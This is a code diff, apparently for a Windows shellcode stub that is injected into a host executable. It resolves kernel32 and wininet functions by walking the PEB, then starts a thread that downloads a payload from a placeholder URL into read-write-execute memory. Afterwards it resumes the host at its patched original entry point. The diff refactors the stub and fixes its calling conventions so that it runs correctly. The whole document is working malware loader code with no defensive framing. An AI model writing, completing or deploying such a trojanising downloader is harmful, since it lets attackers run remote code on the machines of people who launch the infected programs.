@@ -41,6 +41,12 @@ typedef unsigned long long uptr;
 #define EXPDIR_OFF 0x78
 #endif
 
+#ifdef _WIN64
+#define WINAPI
+#else
+#define WINAPI __stdcall
+#endif
+
 typedef unsigned int u32;
 typedef unsigned short u16;
 
@@ -48,21 +54,53 @@ typedef unsigned short u16;
 
 /* ── API function-pointer types ───────────────────────────────────────────── */
 
-typedef void *(*GetProcAddress_t)(void *hModule, const char *name);
-typedef void *(*LoadLibraryA_t)(const char *lib);
-typedef void *(*VirtualAlloc_t)(void *addr, uptr size, u32 allocType, u32 protect);
-typedef void *(*CreateThread_t)(void *sa, uptr stack, void (*start)(void *), void *param, u32 flags, u32 *tid);
-typedef void *(*InternetOpenA_t)(const char *agent, u32 access, const char *proxy, const char *bypass, u32 flags);
-typedef void *(*InternetOpenUrlA_t)(void *hInternet, const char *url, const char *headers, u32 hlen, u32 flags, uptr ctx);
-typedef int (*InternetReadFile_t)(void *hFile, void *buf, u32 toRead, u32 *bytesRead);
+typedef void *(WINAPI *GetProcAddress_t)(void *hModule, const char *name);
+typedef void *(WINAPI *LoadLibraryA_t)(const char *lib);
 
-static GetProcAddress_t pGetProcAddress;
-static LoadLibraryA_t pLoadLibraryA;
-static VirtualAlloc_t pVirtualAlloc;
-static CreateThread_t pCreateThread;
-static InternetOpenA_t pInternetOpenA;
-static InternetOpenUrlA_t pInternetOpenUrlA;
-static InternetReadFile_t pInternetReadFile;
+typedef void *(WINAPI *VirtualAlloc_t)(
+    void *addr,
+    uptr size,
+    u32 allocType,
+    u32 protect);
+
+typedef void *(WINAPI *CreateThread_t)(
+    void *sa,
+    uptr stack,
+    u32(WINAPI *start)(void *),
+    void *param,
+    u32 flags,
+    u32 *tid);
+
+typedef void *(WINAPI *InternetOpenA_t)(
+    const char *agent,
+    u32 access,
+    const char *proxy,
+    const char *bypass,
+    u32 flags);
+
+typedef void *(WINAPI *InternetOpenUrlA_t)(
+    void *hInternet,
+    const char *url,
+    const char *headers,
+    u32 hlen,
+    u32 flags,
+    uptr ctx);
+
+typedef int(WINAPI *InternetReadFile_t)(
+    void *hFile,
+    void *buf,
+    u32 toRead,
+    u32 *bytesRead);
+
+struct API
+{
+    LoadLibraryA_t pLoadLibraryA;
+    VirtualAlloc_t pVirtualAlloc;
+    CreateThread_t pCreateThread;
+    InternetOpenA_t pInternetOpenA;
+    InternetOpenUrlA_t pInternetOpenUrlA;
+    InternetReadFile_t pInternetReadFile;
+};
 
 /* ── Helpers ──────────────────────────────────────────────────────────────── */
 
@@ -115,16 +153,16 @@ char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";
 
 static void download_thread(void *param)
 {
-    (void)param;
-    void *buf = pVirtualAlloc(0, 0x400000, 0x3000 /*COMMIT|RESERVE*/, 0x40 /*RWX*/);
+    struct API *api = (struct API *)param;
+    void *buf = api->pVirtualAlloc(0, 0x400000, 0x3000 /*COMMIT|RESERVE*/, 0x40 /*RWX*/);
     if (!buf)
         return;
 
-    void *hInternet = pInternetOpenA(0, 0, 0, 0, 0);
+    void *hInternet = api->pInternetOpenA(0, 0, 0, 0, 0);
     if (!hInternet)
         return;
 
-    void *hUrl = pInternetOpenUrlA(hInternet, g_url, 0, 0, 0x84000000 /*RELOAD|NO_CACHE_WRITE*/, 0);
+    void *hUrl = api->pInternetOpenUrlA(hInternet, g_url, 0, 0, 0x84000000 /*RELOAD|NO_CACHE_WRITE*/, 0);
     if (!hUrl)
         return;
 
@@ -132,7 +170,7 @@ static void download_thread(void *param)
     u32 got = 0;
     do
     {
-        pInternetReadFile(hUrl, (char *)buf + off, 0x100000, &got);
+        api->pInternetReadFile(hUrl, (char *)buf + off, 0x100000, &got);
         off += got;
     } while (got && off < 0x400000);
 
@@ -144,25 +182,26 @@ static void download_thread(void *param)
 
 __attribute__((section(".text.start"), used)) void _start(void)
 {
-
+    struct API api;
     uptr k32 = kernel32_base();
+    if (!k32)
+        return;
 
-    pGetProcAddress = (GetProcAddress_t)resolve_export(k32, "GetProcAddress");
-    pLoadLibraryA = (LoadLibraryA_t)resolve_export(k32, "LoadLibraryA");
+    api.pCreateThread = (CreateThread_t)resolve_export(k32, "CreateThread");
+    api.pLoadLibraryA = (LoadLibraryA_t)resolve_export(k32, "LoadLibraryA");
 
-    pVirtualAlloc = (VirtualAlloc_t)pGetProcAddress((void *)k32, "VirtualAlloc");
-    pCreateThread = (CreateThread_t)pGetProcAddress((void *)k32, "CreateThread");
+    api.pVirtualAlloc = (VirtualAlloc_t)resolve_export(k32, "VirtualAlloc");
 
-    void *wininet = pLoadLibraryA("wininet.dll");
+    void *wininet = api.pLoadLibraryA("wininet.dll");
     if (wininet)
     {
-        pInternetOpenA = (InternetOpenA_t)pGetProcAddress(wininet, "InternetOpenA");
-        pInternetOpenUrlA = (InternetOpenUrlA_t)pGetProcAddress(wininet, "InternetOpenUrlA");
-        pInternetReadFile = (InternetReadFile_t)pGetProcAddress(wininet, "InternetReadFile");
+        api.pInternetOpenA = (InternetOpenA_t)resolve_export(wininet, "InternetOpenA");
+        api.pInternetOpenUrlA = (InternetOpenUrlA_t)resolve_export(wininet, "InternetOpenUrlA");
+        api.pInternetReadFile = (InternetReadFile_t)resolve_export(wininet, "InternetReadFile");
     }
 
-    if (pCreateThread && pInternetOpenUrlA)
-        pCreateThread(0, 0, download_thread, 0, 0, 0);
+    if (api.pCreateThread && api.pInternetOpenUrlA)
+        api.pCreateThread(0, 0, download_thread, &api, 0, 0);
 
     /* Resume the host: exe base (PEB.Ldr.InLoadOrderModuleList[0]) + patched OEP RVA. */
     uptr peb = PEB();
